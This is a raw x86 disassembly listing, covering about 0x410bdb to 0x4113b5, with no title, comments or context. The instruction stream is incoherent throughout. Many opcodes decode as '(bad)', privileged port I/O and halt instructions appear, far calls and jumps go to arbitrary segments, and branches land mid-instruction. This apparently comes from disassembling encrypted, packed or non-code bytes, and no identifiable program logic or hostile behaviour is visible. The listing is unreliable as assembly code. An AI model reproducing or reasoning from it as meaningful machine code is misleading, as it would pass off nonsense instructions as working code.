  410bdb:	jecxz  0x410c4e
  410bdd:	retf   
  410bde:	pop    esp
  410bdf:	jae    0x410b9a
  410be1:	pop    esp
  410be2:	call   0xafc1f4cf
  410be7:	xchg   BYTE PTR [edi-0x140a053],ch
  410bed:	scas   eax,DWORD PTR es:[edi]
  410bee:	jecxz  0x410be1
  410bf0:	clc    
  410bf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bf2:	retf   
  410bf3:	xchg   edi,eax
  410bf4:	das    
  410bf5:	daa    
  410bf6:	or     eax,DWORD PTR [ebp+0x2a54ba42]
  410bfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bfd:	push   edi
  410bfe:	scas   eax,DWORD PTR es:[edi]
  410bff:	pop    esi
  410c00:	sbb    eax,0x1b86e1be
  410c05:	(bad)  
  410c06:	fbstp  TBYTE PTR [ebp-0x29]
  410c09:	pop    ebp
  410c0a:	aaa    
  410c0b:	fbstp  TBYTE PTR [ebp-0x29]
  410c0e:	pop    ebp
  410c0f:	pop    ebx
  410c10:	sub    BYTE PTR [ebx-0x70],dh
  410c13:	add    al,0x9f
  410c15:	call   0x2244:0xbfbc6913
  410c1c:	adc    ecx,0xc9f1d1d1
  410c22:	leave  
  410c23:	leave  
  410c24:	aas    
  410c25:	mov    WORD PTR [esp+ecx*4-0x2c58b2e4],cs
  410c2c:	xor    esi,esi
  410c2e:	ror    BYTE PTR [ebx+0x68],cl
  410c31:	add    al,0xf3
  410c33:	inc    esp
  410c34:	aas    
  410c35:	pop    edi
  410c36:	aam    0xfa
  410c38:	retf   
  410c39:	adc    edx,edi
  410c3b:	and    eax,0xef77bfc2
  410c40:	fisubr WORD PTR [edi-0xc462312]
  410c46:	pop    ds
  410c47:	sub    al,bl
  410c49:	addr16 div ecx
  410c4c:	mov    bl,BYTE PTR [edi]
  410c4e:	ds jge 0x410c01
  410c51:	cmp    al,0x2a
  410c53:	sub    eax,0x79e2fc7e
  410c58:	add    BYTE PTR [esi-0x69c8d094],dl
  410c5e:	inc    eax
  410c5f:	mov    al,0xb
  410c61:	loopne 0x410c74
  410c63:	rcl    edx,0x77
  410c66:	inc    ecx
  410c67:	inc    esp
  410c68:	rol    BYTE PTR [edi+0x16],0x12
  410c6c:	arpl   WORD PTR [edx+eiz*1],cx
  410c6f:	sbb    eax,esi
  410c71:	arpl   WORD PTR [esi-0x49],bp
  410c74:	fcmovne st,st(2)
  410c76:	out    0x34,al
  410c78:	or     al,0xc3
  410c7a:	dec    edx
  410c7b:	cld    
  410c7c:	mov    ds:0x6f4c87ef,al
  410c81:	push   0xd
  410c83:	enter  0x72e5,0xe8
  410c87:	jmp    0x9314:0x4e5a92ea
  410c8e:	mov    al,ds:0x2972001c
  410c93:	mov    DWORD PTR [eax],eax
  410c95:	cmp    BYTE PTR [ecx],dl
  410c97:	nop
  410c98:	xchg   ebp,eax
  410c99:	push   eax
  410c9a:	sub    dl,BYTE PTR [ebp-0x391c8e50]
  410ca0:	fistp  DWORD PTR [esi+0x7f89e278]
  410ca6:	(bad)  
  410ca7:	jmp    0x2ffb8bfb
  410cac:	sbb    cl,BYTE PTR [ebp+0x152a56ce]
  410cb2:	push   edi
  410cb3:	cs xchg edi,eax
  410cb5:	ror    DWORD PTR [edi+0x7232391c],cl
  410cbb:	in     al,0xc8
  410cbd:	xchg   ecx,eax
  410cbe:	mov    eax,ds:0x67ecfd9f
  410cc3:	out    dx,al
  410cc4:	pusha  
  410cc5:	xor    BYTE PTR [eax],bl
  410cc7:	mov    eax,0xfedbb6ed
  410ccc:	jmp    0x81e:0xde6f9be6
  410cd3:	add    al,0xd6
  410cd5:	sbb    eax,0xddf47a3d
  410cda:	xchg   ebx,eax
  410cdb:	daa    
  410cdc:	dec    edi
  410cdd:	push   ds
  410cde:	add    edx,eax
  410ce0:	leave  
  410ce1:	(bad)  
  410ce2:	outs   dx,DWORD PTR ds:[esi]
  410ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ce4:	lds    edi,FWORD PTR [edx+0x20b2db8]
  410cea:	repnz add BYTE PTR [ecx],ah
  410ced:	daa    
  410cee:	add    DWORD PTR [edx+0x49],esi
  410cf1:	test   eax,0xa40cb72c
  410cf6:	pop    eax
  410cf7:	popa   
  410cf8:	ja     0x410d5a
  410cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cfb:	adc    al,0x45
  410cfd:	fld    st(0)
  410cff:	std    
  410d00:	jg     0x410d1c
  410d02:	adc    al,0x94
  410d04:	(bad)  
  410d05:	push   0x1f6a00b2
  410d0a:	fwait
  410d0b:	imul   esi,DWORD PTR [ebp+0x16],0x86c20ca2
  410d12:	sti    
  410d13:	shr    al,1
  410d15:	pop    ecx
  410d16:	pop    ss
  410d17:	push   cs
  410d18:	xchg   DWORD PTR [ebp-0x6054a48a],ebp
  410d1e:	mov    eax,0x37799b5a
  410d23:	push   ds
  410d24:	(bad)  
  410d25:	arpl   WORD PTR [edx+0x62],sp
  410d28:	add    ch,BYTE PTR [ecx-0x75dd35ac]
  410d2e:	pusha  
  410d2f:	xor    BYTE PTR [eax+0x608c3870],cl
  410d35:	xor    BYTE PTR [eax-0x717bd7b0],cl
  410d3b:	mov    cs,WORD PTR [esi]
  410d3d:	xchg   edi,eax
  410d3e:	iret   
  410d3f:	out    0xb,eax
  410d41:	add    DWORD PTR [eax+0x5ecd9b3e],edi
  410d47:	pop    edi
  410d48:	out    dx,eax
  410d49:	cmc    
  410d4a:	addr16 mov eax,0xc3c2eedd
  410d50:	(bad)  
  410d52:	in     al,dx
  410d53:	jmp    0x410d40
  410d55:	jmp    0x410d4a
  410d57:	add    al,0x83
  410d59:	inc    ecx
  410d5a:	js     0x410d19
  410d5c:	pop    esi
  410d5d:	retf   
  410d5e:	(bad)  
  410d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d60:	in     al,0x90
  410d62:	(bad)
  410d65:	dec    esp
  410d66:	dec    esi
  410d67:	dec    esi
  410d68:	and    bl,BYTE PTR [edx]
  410d6a:	lea    esp,[edx]
  410d6c:	push   ds
  410d6d:	(bad)  
  410d6e:	setge  BYTE PTR ds:0xd4c0f67b
  410d75:	aam    0xd4
  410d77:	inc    edi
  410d78:	xchg   BYTE PTR [ecx+0x64],ah
  410d7b:	ror    BYTE PTR [eax],1
  410d7d:	mov    ah,0x14
  410d7f:	mov    al,0x34
  410d81:	call   0xf6fa:0x27d1976f
  410d88:	mov    ds:0xf024df7f,al
  410d8d:	in     al,dx
  410d8e:	std    
  410d8f:	push   esi
  410d90:	imul   ebp
  410d92:	(bad)  [edi-0x29]
  410d95:	sbb    eax,0xdbf1dc77
  410d9a:	bound  esi,QWORD PTR [ecx-0x3524ebe8]
  410da0:	jmp    0xd72869fc
  410da5:	adc    edi,edi
  410da7:	xchg   ebp,eax
  410da8:	xchg   ebp,eax
  410da9:	adc    DWORD PTR [edi+0x333c32f3],ecx
  410daf:	iret   
  410db0:	mov    es,WORD PTR [eax+edi*8+0x39]
  410db4:	push   esi
  410db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410db6:	ins    DWORD PTR es:[edi],dx
  410db7:	pop    edx
  410db8:	sbb    bh,al
  410dba:	cmp    ah,BYTE PTR [ebp+0x156f35f]
  410dc0:	cli    
  410dc1:	pop    esi
  410dc2:	mov    eax,0x81922cff
  410dc7:	sbb    eax,0x11d59039
  410dcc:	or     BYTE PTR [edx+ebx*4],al
  410dcf:	fmul   QWORD PTR [edi]
  410dd1:	dec    ebp
  410dd2:	rcl    DWORD PTR [eax-0x326e9933],cl
  410dd8:	xchg   cx,ax
  410dda:	leave  
  410ddb:	mov    al,fs:0x7a7a0a28
  410de1:	jp     0x410d8f
  410de3:	cli    
  410de4:	xchg   ecx,eax
  410de5:	push   ebp
  410de6:	inc    ecx
  410de7:	push   ecx
  410de8:	jns    0x410e18
  410dea:	hlt    
  410deb:	je     0x410d89
  410ded:	aas    
  410dee:	sbb    edi,DWORD PTR [ecx-0x653bbfe]
  410df4:	jl     0x410e14
  410df6:	pop    ebx
  410df7:	mov    dh,0x6c
  410df9:	fprem1 
  410dfb:	les    edx,FWORD PTR [ebx]
  410dfd:	dec    edi
  410dfe:	cld    
  410dff:	(bad)  
  410e00:	daa    
  410e01:	lahf   
  410e02:	jl     0x410df6
  410e04:	jnp    0x410d91
  410e06:	mov    ecx,DWORD PTR [ebx-0x1d56e5e6]
  410e0c:	(bad)  
  410e0d:	push   0xffffffb5
  410e0f:	push   0x68
  410e11:	call   0xc2ec:0x763b1e66
  410e18:	mov    cl,0x63
  410e1a:	(bad)  
  410e1b:	ds scas al,BYTE PTR es:[edi]
  410e1d:	push   edi
  410e1f:	push   ds
  410e20:	aam    0x84
  410e22:	lahf   
  410e23:	imul   esi,DWORD PTR [edi+0x51],0xffffffd3
  410e27:	mov    eax,DWORD PTR [eax+eax*1]
  410e2a:	sub    al,0xd
  410e2c:	adc    BYTE PTR [edx+0x3245f9a],cl
  410e32:	xor    DWORD PTR [eax],ebp
  410e34:	dec    eax
  410e35:	push   ss
  410e36:	add    eax,edx
  410e38:	add    BYTE PTR [esi+edx*2],0x44
  410e3c:	add    BYTE PTR [edx-0x4cb75b5e],cl
  410e42:	mov    eax,DWORD PTR [ecx-0x41]
  410e45:	fidiv  DWORD PTR [esi-0x5c99a13f]
  410e4b:	ror    DWORD PTR [esi],cl
  410e4d:	mov    ch,0xa1
  410e4f:	sbb    eax,DWORD PTR [esi+0x1b1bb561]
  410e55:	xchg   BYTE PTR [ecx-0x173c790],al
  410e5b:	(bad)  
  410e5c:	jle    0x410e49
  410e5e:	pop    fs
  410e60:	mov    dl,0xe5
  410e62:	jb     0x410e7d
  410e64:	mov    ds:0x1b18a3a3,eax
  410e69:	sbb    eax,DWORD PTR [ebx-0x4a]
  410e6c:	ds ret 0x9d0c
  410e70:	dec    ebx
  410e71:	cmp    edx,esp
  410e73:	fs and eax,edx
  410e76:	pop    ds
  410e77:	scas   eax,DWORD PTR es:[edi]
  410e78:	jmp    0x410ef4
  410e7a:	jge    0x410e2a
  410e7c:	sti    
  410e7d:	push   cs
  410e7e:	test   bl,al
  410e80:	popa   
  410e81:	or     al,0xc
  410e83:	or     al,0xb8
  410e85:	cmp    bh,BYTE PTR [edx]
  410e87:	cmp    al,BYTE PTR [edx-0x55]
  410e8a:	push   edi
  410e8b:	scas   eax,DWORD PTR es:[edi]
  410e8c:	inc    esi
  410e8d:	xor    BYTE PTR [eax],bl
  410e8f:	test   bh,bl
  410e91:	out    dx,eax
  410e92:	xchg   DWORD PTR [ecx+0x18],esp
  410e95:	dec    ebp
  410e96:	int    0x79
  410e98:	xchg   edi,eax
  410e99:	cs pop ebp
  410e9b:	inc    edx
  410e9c:	cmp    al,0x1e
  410e9e:	(bad)  
  410e9f:	cld    
  410ea0:	cld    
  410ea1:	jl     0x410f1d
  410ea3:	push   0xbe5e868
  410ea8:	pop    ss
  410ea9:	cs mov esp,0xe20dad5d
  410eaf:	inc    ecx
  410eb0:	das    
  410eb1:	xchg   edi,eax
  410eb2:	int3   
  410eb3:	jns    0x410eff
  410eb5:	ficom  DWORD PTR [ecx]
  410eb7:	xor    eax,0x12000f3e
  410ebc:	fist   DWORD PTR [edx+0x699a2f9f]
  410ec2:	mov    ds:0xbfaf83f0,al
  410ec7:	repnz retf 0xa12b
  410ecb:	dec    eax
  410ecc:	and    al,0xf2
  410ece:	mov    edi,0x2e0b4d34
  410ed3:	(bad)  
  410ed4:	in     al,dx
  410ed5:	xchg   edi,eax
  410ed6:	sbb    eax,0xb10723b3
  410edb:	mov    esp,0x49103dcc
  410ee0:	ret    0x22ce
  410ee3:	loopne 0x410e82
  410ee5:	mov    edx,0x86113f68
  410eea:	cwde   
  410eeb:	inc    ebp
  410eec:	mov    DWORD PTR [ebx-0x2071ab7e],0x45030793
  410ef6:	xor    ah,BYTE PTR [eax]
  410ef8:	rcl    DWORD PTR [ebx],0x5b
  410efb:	sub    BYTE PTR [edi+edx*4-0x55faa33a],ch
  410f02:	pop    ss
  410f03:	dec    ebp
  410f04:	xlat   BYTE PTR ds:[ebx]
  410f05:	push   esi
  410f06:	sub    dl,BYTE PTR [ebp-0x539b3670]
  410f0c:	sub    al,0xcd
  410f0e:	dec    eax
  410f0f:	and    al,0x62
  410f11:	inc    ebp
  410f12:	loop   0x410f8d
  410f14:	inc    edx
  410f15:	xchg   edx,eax
  410f16:	push   0x89598945
  410f1b:	push   esp
  410f1c:	addr16 dec esi
  410f1e:	adc    BYTE PTR [ebp-0x2914febe],al
  410f24:	lods   eax,DWORD PTR ds:[esi]
  410f25:	mov    ebx,0x9dcee77e
  410f2a:	pop    edi
  410f2b:	cmp    BYTE PTR [esi-0x14],dh
  410f2e:	fdivr  DWORD PTR [edi+0x43cc96a3]
  410f34:	add    al,BYTE PTR [edi-0x3e]
  410f37:	inc    edi
  410f38:	and    esi,DWORD PTR [edi]
  410f3a:	mov    edi,DWORD PTR [esi-0x118e27c2]
  410f40:	fcomi  st,st(3)
  410f42:	outs   dx,DWORD PTR ds:[esi]
  410f43:	or     DWORD PTR [ebx],0xffffffb0
  410f46:	mov    dl,dh
  410f48:	fisttp WORD PTR [esi]
  410f4a:	mov    edi,0xbf37bf2f
  410f4f:	pop    ds
  410f50:	inc    ecx
  410f51:	dec    edx
  410f52:	add    cl,bl
  410f54:	add    BYTE PTR es:[ebp-0x29],bl
  410f58:	stos   DWORD PTR es:[edi],eax
  410f59:	add    BYTE PTR [edx-0x66e44892],dl
  410f5f:	dec    esp
  410f60:	sbb    dh,BYTE PTR [ebx-0x1417cc4d]
  410f66:	jmp    0x410f6f
  410f68:	dec    ebp
  410f69:	(bad)  
  410f6b:	call   0x2b25b92
  410f70:	mov    ch,0x69
  410f72:	ds je  0x410f13
  410f75:	jle    0x410f60
  410f77:	jbe    0x410f34
  410f79:	inc    ecx
  410f7a:	cmp    eax,0xb82cf8e8
  410f7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f80:	push   edx
  410f81:	or     ecx,edx
  410f83:	push   0x93939314
  410f88:	pop    eax
  410f89:	pop    eax
  410f8a:	pop    eax
  410f8b:	and    BYTE PTR [ebx],dh
  410f8d:	shr    DWORD PTR [eax],1
  410f8f:	xchg   edi,eax
  410f90:	retf   
  410f91:	fiadd  WORD PTR cs:[esi+edx*2]
  410f95:	lods   eax,DWORD PTR ds:[esi]
  410f96:	push   esi
  410f97:	push   ecx
  410f98:	sub    bh,bl
  410f9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f9b:	mov    al,0x32
  410f9d:	add    BYTE PTR [eax],al
  410f9f:	pop    ss
  410fa0:	jae    0x410feb
  410fa2:	inc    esp
  410fa3:	inc    ecx
  410fa4:	push   esp
  410fa5:	xchg   ebp,eax
  410fa6:	lods   al,BYTE PTR ds:[esi]
  410fa7:	aas    
  410fa8:	xchg   ebp,eax
  410fa9:	xor    al,0x3b
  410fab:	cdq    
  410fac:	jae    0x410fec
  410fae:	lahf   
  410faf:	(bad)  
  410fb1:	jge    0x411030
  410fb3:	push   esi
  410fb4:	add    al,BYTE PTR [esi-0x5d4a1429]
  410fba:	retf   0x2f97
  410fbd:	pop    edi
  410fbe:	inc    esi
  410fbf:	cmp    bl,BYTE PTR [ebp+0x8c8c8c6]
  410fc5:	es daa 
  410fc7:	daa    
  410fc8:	jae    0x410f7b
  410fca:	pop    eax
  410fcb:	in     al,dx
  410fcc:	call   0xec3200c1
  410fd1:	cdq    
  410fd2:	dec    esp
  410fd3:	es (bad) 
  410fd5:	pop    esi
  410fd6:	stos   BYTE PTR es:[edi],al
  410fd7:	lods   al,BYTE PTR ds:[esi]
  410fd8:	int    0x5e
  410fda:	(bad)  
  410fdb:	mov    WORD PTR [edi+0x66],es
  410fde:	mov    esi,0xb2abdc18
  410fe3:	imul   ebx,ecx,0x6a
  410fe6:	jl     0x410fe6
  410fe8:	jle    0x41102d
  410fea:	mov    eax,ds:0x4d340fd0
  410fef:	mov    ebx,0xdbeb4ed9
  410ff4:	or     DWORD PTR [ebx+ebp*1-0x15],esp
  410ff8:	and    BYTE PTR [eax],0x5b
  410ffb:	xchg   edi,eax
  410ffc:	jge    0x410fe6
  410ffe:	jbe    0x410fe6
  411000:	mov    dl,0x78
  411002:	or     eax,0x36ad4d00
  411007:	rcl    BYTE PTR [edx+0x4b],0x0
  41100b:	push   0x49ae0b26
  411010:	inc    ebp
  411011:	bound  esp,QWORD PTR [eax]
  411013:	ret    0x3221
  411016:	and    BYTE PTR [edi-0x6f],dl
  411019:	xchg   esp,eax
  41101a:	push   es
  41101b:	iret   
  41101c:	rcl    BYTE PTR [ebx],1
  41101e:	sti    
  41101f:	loopne 0x411094
  411021:	mov    ds:0xfdfb7ba0,al
  411026:	jle    0x411053
  411028:	sbb    esi,DWORD PTR [eax-0x2ca6d5ac]
  41102e:	mov    eax,0xeb51baf1
  411033:	adc    al,0xd5
  411035:	inc    ecx
  411036:	and    al,0x2a
  411038:	dec    esi
  411039:	fs cld 
  41103b:	xchg   edi,eax
  41103c:	xchg   esp,eax
  41103d:	fiadd  WORD PTR [ebx-0x1f07c1f1]
  411043:	jnp    0x411034
  411045:	mov    ebp,0xf9acc477
  41104a:	rcl    BYTE PTR [ebp+ecx*8-0x1332d3f9],0x3
  411052:	call   0xe40a:0xe02e03bf
  411059:	or     al,BYTE PTR [edx+0x50864d62]
  41105f:	sahf   
  411060:	scas   al,BYTE PTR es:[edi]
  411061:	and    eax,0xb2686c4e
  411066:	jae    0x411010
  411068:	or     bl,BYTE PTR ds:[edx+0x358e8749]
  41106f:	popa   
  411070:	inc    ebp
  411071:	jecxz  0x411074
  411073:	mov    esp,0xcfdbf6fd
  411078:	out    dx,eax
  411079:	fnstsw WORD PTR [ebx+0x52a57777]
  41107f:	jmp    0x8b78bc1
  411084:	pop    ebp
  411085:	pop    ebp
  411086:	fnstsw WORD PTR [eax-0x14c4310d]
  41108c:	xchg   ecx,eax
  41108d:	stc    
  41108e:	jb     0x411023
  411090:	or     esp,DWORD PTR [eax+0x47db5aa]
  411096:	push   0xffffffe7
  411098:	and    eax,0xccb4a501
  41109d:	jp     0x4110b9
  41109f:	sub    eax,0x31676766
  4110a4:	cmp    edi,DWORD PTR [ebx]
  4110a6:	mov    ebp,DWORD PTR [esi+esi*1+0xb]
  4110aa:	push   ebp
  4110ab:	push   ebp
  4110ac:	xchg   ecx,eax
  4110ad:	leave  
  4110ae:	fs (bad) 
  4110b0:	sbb    BYTE PTR [edi+0x72e74fc7],cl
  4110b6:	mov    ecx,0xfd358004
  4110bb:	std    
  4110bc:	std    
  4110bd:	ja     0x411043
  4110bf:	inc    edx
  4110c0:	mov    eax,ds:0x478f1e4d
  4110c5:	imul   ecx,DWORD PTR [ebp+ecx*2-0x13],0x22002269
  4110cd:	cmp    esi,0x4a947efe
  4110d3:	and    eax,0x981e3c78
  4110d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110d9:	mov    DWORD PTR [edx+ebp*1-0x7b],edx
  4110dd:	push   esp
  4110de:	sub    al,BYTE PTR [ebp+0xa119191]
  4110e4:	lock lea ecx,[edi+ecx*1]
  4110e8:	ud0    edi,DWORD PTR [esi+0x7e]
  4110ec:	jle    0x4110ec
  4110ee:	push   esp
  4110ef:	cs xchg edi,eax
  4110f1:	mov    esi,DWORD PTR [ebx+0x79cc813f]
  4110f7:	xchg   ecx,eax
  4110f8:	add    BYTE PTR [ecx+edx*8+0x7c],ah
  4110fc:	sar    al,cl
  4110fe:	bound  esi,QWORD PTR [edi+ebx*2]
  411101:	(bad)  
  411102:	adc    al,0xd3
  411104:	xor    ah,BYTE PTR [eax]
  411106:	repz mov ebx,0x736efddf
  41110c:	mov    eax,ds:0xb68c7850
  411111:	in     eax,dx
  411112:	test   BYTE PTR [ecx+0x26],bl
  411115:	fmul   st,st(3)
  411117:	and    eax,0xd45d710a
  41111c:	bnd jl 0x4110ba
  41111f:	or     eax,DWORD PTR [esi-0x6f8fad18]
  411125:	mov    al,ds:0x73168690
  41112a:	jmp    DWORD PTR [ebp-0x5]
  41112d:	leave  
  41112e:	jl     0x411117
  411130:	pop    ecx
  411131:	jbe    0x411195
  411133:	mov    ebp,0xd5af5ebc
  411138:	cld    
  411139:	inc    esi
  41113a:	scas   al,BYTE PTR es:[edi]
  41113b:	add    DWORD PTR [edi+0x410d0021],ecx
  411141:	in     al,0xf7
  411143:	jecxz  0x41113c
  411145:	mov    eax,ds:0xe3c7b260
  41114a:	pop    ecx
  41114b:	adc    bl,BYTE PTR [ebx-0x7fb77a5e]
  411151:	xchg   ebx,eax
  411152:	or     esi,DWORD PTR [edi+0x73f3f832]
  411158:	sub    esp,DWORD PTR [eax-0x389dd3a8]
  41115e:	mov    ds,WORD PTR ds:0xf0fc3cf7
  411164:	ret    
  411165:	(bad)  
  411167:	mov    edi,0xa8abff7f
  41116c:	leave  
  41116d:	xchg   ecx,eax
  41116e:	popf   
  41116f:	mov    ecx,0x310b340e
  411174:	outs   dx,DWORD PTR ds:[esi]
  411175:	mov    bl,0xe7
  411177:	jle    0x4111b5
  411179:	and    BYTE PTR [edi],ah
  41117b:	paddd  mm1,mm3
  41117e:	lods   eax,DWORD PTR ds:[esi]
  41117f:	add    cl,BYTE PTR [eax-0x36]
  411182:	leave  
  411183:	sub    al,0x9
  411185:	xchg   edi,eax
  411186:	jo     0x411134
  411188:	jmp    0x1526da8
  41118d:	dec    esp
  41118e:	dec    ebp
  41118f:	dec    ebp
  411190:	jge    0x41120a
  411192:	icebp  
  411193:	loop   0x41115a
  411195:	push   DWORD PTR [edx-0x68492493]
  41119b:	mov    eax,ebp
  41119d:	mov    ds:0x873f3f3a,al
  4111a2:	shl    DWORD PTR [edi+0x2a54a14f],cl
  4111a8:	shr    edi,0xaf
  4111ab:	in     eax,0xd7
  4111ad:	jo     0x411225
  4111af:	scas   eax,DWORD PTR es:[edi]
  4111b0:	cmc    
  4111b1:	sbb    DWORD PTR [eax+0x73625cbd],ebp
  4111b7:	mov    al,ds:0xca6811a1
  4111bc:	sub    al,0xea
  4111be:	enter  0xf53,0xc
  4111c2:	(bad)  
  4111c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111c6:	(bad)  
  4111c7:	mov    WORD PTR [ebp+0x2e507d8d],cs
  4111cd:	xchg   edi,eax
  4111ce:	dec    ebx
  4111cf:	cmc    
  4111d0:	cmp    cl,BYTE PTR [esi]
  4111d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111d3:	push   edx
  4111d4:	test   eax,0xc89123f7
  4111d9:	xchg   dh,cl
  4111db:	into   
  4111dc:	into   
  4111dd:	call   eax
  4111df:	rcl    ebx,cl
  4111e1:	mov    bl,0xcb
  4111e3:	jmp    0x4111da
  4111e5:	jbe    0x411237
  4111e7:	xor    BYTE PTR [edi+0x72e5c008],al
  4111ed:	pop    ecx
  4111ee:	add    eax,DWORD PTR [ebx+0x78152a54]
  4111f4:	cmp    al,0x1e
  4111f6:	or     ch,dl
  4111f8:	popa   
  4111f9:	jl     0x411277
  4111fb:	sbb    al,0xd1
  4111fd:	push   0x74747c74
  411202:	je     0x411283
  411204:	sub    al,0x16
  411206:	jnp    0x4111e7
  411208:	xor    al,0x4d
  41120a:	sbb    cl,BYTE PTR [esi-0x8c74b77]
  411210:	in     eax,dx
  411211:	(bad)
  411214:	mov    cl,0xd3
  411216:	mov    gs,WORD PTR [ecx+ecx*1+0x28bd0b8f]
  41121d:	call   0x85f2354f
  411222:	inc    edx
  411223:	popa   
  411224:	xchg   edi,eax
  411225:	mov    ds:0xdc36d428,al
  41122a:	push   esi
  41122b:	js     0x4111dc
  41122d:	aam    0x4a
  41122f:	and    BYTE PTR [eax+0x3f18aebe],cl
  411235:	adc    bl,bl
  411237:	leave  
  411238:	stc    
  411239:	cmp    eax,0xe24a1e9a
  41123e:	push   DWORD PTR [ebx+0x41]
  411241:	daa    
  411242:	inc    ecx
  411243:	adc    al,0x4d
  411245:	imul   ebx,esi,0x933e2b9c
  41124b:	sub    BYTE PTR [eax-0x284363cc],al
  411251:	jmp    0x411208
  411253:	lods   al,BYTE PTR ds:[esi]
  411254:	add    bl,BYTE PTR [ecx-0x12]
  411257:	inc    ecx
  411258:	sub    eax,0xba68d4f3
  41125d:	aas    
  41125e:	call   DWORD PTR [esi]
  411260:	inc    ebp
  411261:	ret    0xcd10
  411264:	jle    0x411217
  411266:	arpl   WORD PTR [edx],dx
  411268:	aas    
  411269:	(bad)  
  41126a:	pop    ebx
  41126b:	push   ds
  41126c:	mov    WORD PTR [eax-0x6c],fs
  41126f:	pop    es
  411270:	pop    ds
  411271:	jl     0x411263
  411273:	xchg   ecx,eax
  411274:	aaa    
  411275:	fidivr WORD PTR [eax-0x1d]
  411278:	push   eax
  411279:	test   eax,0x59a32a54
  41127e:	xor    BYTE PTR [ecx+0x33b51696],bh
  411284:	lods   eax,DWORD PTR ds:[esi]
  411285:	fwait
  411286:	push   0xeb5ccc2d
  41128b:	mov    bh,0x13
  41128d:	jp     0x41124d
  41128f:	cs jae 0x4112cb
  411292:	test   al,0x4f
  411294:	leave  
  411295:	xchg   edx,eax
  411296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411297:	rcl    DWORD PTR ds:0xfbf4088f,0xdf
  41129e:	(bad)  
  41129f:	(bad)  
  4112a0:	(bad)  
  4112a1:	clc    
  4112a2:	jl     0x411262
  4112a4:	popf   
  4112a5:	fwait
  4112a6:	ss ins DWORD PTR es:[edi],dx
  4112a8:	cli    
  4112a9:	mov    eax,ds:0x9998aaaa
  4112ae:	cdq    
  4112af:	sub    DWORD PTR [edx+0x2a8508aa],0x40585858
  4112b9:	and    al,0x12
  4112bb:	mov    cl,0xcc
  4112bd:	jp     0x4112b9
  4112bf:	ds test al,0x59
  4112c2:	mov    BYTE PTR [esi+0x5e],bl
  4112c5:	ds lahf 
  4112c7:	(bad)  
  4112c8:	in     al,dx
  4112c9:	in     al,dx
  4112ca:	lods   al,BYTE PTR ds:[esi]
  4112cb:	aad    0x75
  4112cd:	mov    bh,0xce
  4112cf:	(bad)  
  4112d0:	leave  
  4112d1:	mov    edx,DWORD PTR [edi]
  4112d3:	das    
  4112d4:	(bad)  
  4112d5:	es push ss
  4112d7:	mov    ebx,DWORD PTR [ebp-0x70c28a2f]
  4112dd:	pop    edx
  4112de:	jo     0x411265
  4112e0:	xor    ch,ah
  4112e2:	push   eax
  4112e3:	lods   eax,DWORD PTR ds:[esi]
  4112e4:	push   esi
  4112e5:	mov    ecx,DWORD PTR [ebx+0x17678b8b]
  4112eb:	pop    ss
  4112ec:	pop    ss
  4112ed:	xchg   DWORD PTR [edx-0x313e1b37],edx
  4112f3:	into   
  4112f4:	into   
  4112f5:	pop    ebx
  4112f6:	and    dl,BYTE PTR [ecx+0x60c18dc8]
  4112fc:	jo     0x411299
  4112fe:	popa   
  4112ff:	sbb    BYTE PTR [esi+0x4a],bl
  411302:	mov    ax,ds:0xebd79f20
  411308:	(bad)
  41130b:	sub    al,0x8e
  41130d:	pop    ds
  41130e:	aas    
  41130f:	mov    fs,WORD PTR [edx+esi*1+0x59]
  411313:	sahf   
  411314:	sahf   
  411315:	sahf   
  411316:	cmp    BYTE PTR ds:[esp+edi*1],bh
  41131a:	cld    
  41131b:	outs   dx,DWORD PTR ds:[esi]
  41131c:	test   DWORD PTR [edx+0x61],eax
  41131f:	scas   al,BYTE PTR es:[edi]
  411320:	(bad)  
  411321:	fcomp  QWORD PTR [ebx+eiz*8-0xd]
  411325:	out    0x3c,al
  411327:	mov    cl,0x29
  411329:	pop    DWORD PTR [edi]
  41132b:	idiv   DWORD PTR [eax-0x19754850]
  411331:	jae    0x4112e7
  411333:	adc    al,0xfe
  411335:	cmp    dh,BYTE PTR [esi+0x2]
  411338:	lods   eax,DWORD PTR ds:[esi]
  411339:	dec    ebp
  41133a:	jne    0x411377
  41133c:	sub    al,0x47
  41133e:	repz repz mov dl,0x32
  411342:	loope  0x41135b
  411344:	xor    eax,0xe012ccbe
  411349:	mul    eax
  41134b:	es mov esi,0x34dcf028
  411351:	daa    
  411352:	test   DWORD PTR [edi-0x66f47fb8],0x5f82d5ac
  41135c:	xchg   DWORD PTR [edi-0x36ee0459],edx
  411362:	xchg   ebx,eax
  411363:	inc    ebp
  411364:	push   eax
  411365:	sub    dl,BYTE PTR [ebp+0x324809a4]
  41136b:	jae    0x41130b
  41136d:	mov    ah,0x3d
  41136f:	daa    
  411370:	or     DWORD PTR [edx-0x17d32ffd],ebp
  411376:	mov    ds:0x4bafc04b,al
  41137b:	in     eax,0xea
  41137d:	mov    ds:0xf9b86d41,eax
  411382:	out    0x9b,al
  411384:	outs   dx,DWORD PTR ds:[esi]
  411385:	cmp    al,0x71
  411387:	loop   0x41134d
  411389:	sbb    esp,edx
  41138b:	cmp    BYTE PTR [ebp+0x5c],0xf8
  41138f:	js     0x4113f1
  411391:	addps  xmm5,XMMWORD PTR [edx+0x5]
  411395:	lock aas 
  411397:	dec    eax
  411398:	mov    dh,0xce
  41139a:	add    eax,0x713955b8
  41139f:	popf   
  4113a0:	outs   dx,DWORD PTR ds:[esi]
  4113a1:	jae    0x41132e
  4113a3:	sub    DWORD PTR [ebx+ecx*1+0x1315bd7e],0x7aa00280
  4113ae:	in     al,dx
  4113af:	fdiv   DWORD PTR [ecx+0x5f3e7ce7]
  4113b5:	ja     0x411436
